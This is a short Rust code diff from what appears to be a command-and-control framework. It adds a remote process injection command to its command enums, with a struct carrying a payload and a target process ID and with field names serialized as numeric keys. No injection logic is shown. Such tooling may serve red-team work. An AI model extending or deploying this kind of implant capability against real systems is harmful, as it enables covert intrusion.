@@ -55,6 +55,8 @@ pub enum Command {
     ConsoleMessages,
     Spawn,
     StaticWof,
+    /// Perform remote process injection
+    Inject,
     // This should be totally unreachable; but keeping to make sure we don't get any weird UB, and
     // make sure it is itemised last in the enum
     Undefined,
@@ -195,6 +197,7 @@ impl Display for Command {
             Command::WhoAmI => "whoami",
             Command::Spawn => "SpawnChild",
             Command::StaticWof => "StaticWof",
+            Command::Inject => "Inject",
         };
 
         write!(f, "{choice}")
@@ -206,6 +209,15 @@ pub struct DotExInner {
     /// A partial path to the tool in the /tools mount
     pub tool_path: String,
     pub args: Vec<String>,
+}
+
+#[derive(Serialize, Deserialize, Clone)]
+#[serde(rename = "1")]
+pub struct InjectInner {
+    #[serde(rename = "2")]
+    pub payload: String,
+    #[serde(rename = "3")]
+    pub pid: u32,
 }
 
 impl DotExInner {
@@ -250,6 +262,7 @@ pub enum AdminCommand {
     WhoAmI,
     Spawn(String),
     StaticWof(String),
+    Inject(InjectInner),
     /// Used for dispatching no admin command, but to be handled via a custom route on the C2
     None,
     Undefined,
